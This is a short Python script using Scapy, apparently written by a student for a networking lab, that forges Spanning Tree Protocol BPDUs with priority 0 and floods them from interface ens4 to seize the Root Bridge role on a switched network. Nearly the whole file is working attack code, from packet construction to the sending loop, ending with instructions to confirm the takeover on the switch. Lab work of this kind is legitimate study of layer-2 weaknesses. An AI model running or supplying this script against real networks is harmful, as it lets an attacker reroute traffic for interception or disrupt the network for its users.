#!/usr/bin/env python3
# ============================================
# STP Root Attack Script
# Autor: Sael German Garcia
# Matricula: 2025-0725
# Descripcion: Envia BPDUs falsos con prioridad
#              0 para reclamar el rol de
#              Root Bridge en la red
# ============================================

from scapy.all import *
import struct
import sys
import time

INTERFACE = "ens4"
ATTACKER_MAC = get_if_hwaddr(INTERFACE)

def build_bpdu(root_mac, bridge_mac, vlan=1):
    # STP BPDU con prioridad 0 (mas baja posible = gana la eleccion)
    root_id    = struct.pack('!H', 0x0000) + bytes.fromhex(root_mac.replace(':', ''))
    bridge_id  = struct.pack('!H', 0x0000) + bytes.fromhex(bridge_mac.replace(':', ''))

    bpdu = (
        b'\x00\x00'         # Protocol ID: STP
        b'\x00'             # Version: STP
        b'\x00'             # BPDU Type: Configuration
        b'\x00'             # Flags
        + root_id +         # Root ID (prioridad 0 + MAC atacante)
        struct.pack('!I', 0) +   # Root Path Cost: 0
        bridge_id +         # Bridge ID
        struct.pack('!H', 0x8001) +  # Port ID
        struct.pack('!H', 0x0100) +  # Message Age
        struct.pack('!H', 0x1400) +  # Max Age (20 seg)
        struct.pack('!H', 0x0200) +  # Hello Time (2 seg)
        struct.pack('!H', 0x0f00)    # Forward Delay (15 seg)
    )

    frame = (
        Ether(src=bridge_mac, dst='01:80:c2:00:00:00') /
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
        Raw(bpdu)
    )
    return frame

def stp_attack(interface, count):
    mac = get_if_hwaddr(interface)
    print("="*50)
    print("  STP Root Attack")
    print("  Autor: Sael German Garcia")
    print("  Matricula: 2025-0725")
    print("="*50)
    print(f"[*] Interfaz:    {interface}")
    print(f"[*] MAC atacante: {mac}")
    print(f"[*] Prioridad:   0 (Root Bridge claim)")
    print(f"[*] Paquetes:    {count}")
    print("[*] Iniciando ataque...\n")

    for i in range(count):
        frame = build_bpdu(mac, mac)
        sendp(frame, iface=interface, verbose=0)

        if (i+1) % 50 == 0:
            print(f"[+] BPDUs enviados: {i+1}/{count}")

        time.sleep(0.1)  # Hello time: cada 100ms

    print(f"\n[+] Ataque completado!")
    print("[!] Verifica en SW1: show spanning-tree")
    print("[!] Debe mostrar al atacante como Root Bridge")

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 100
    stp_attack(INTERFACE, count)
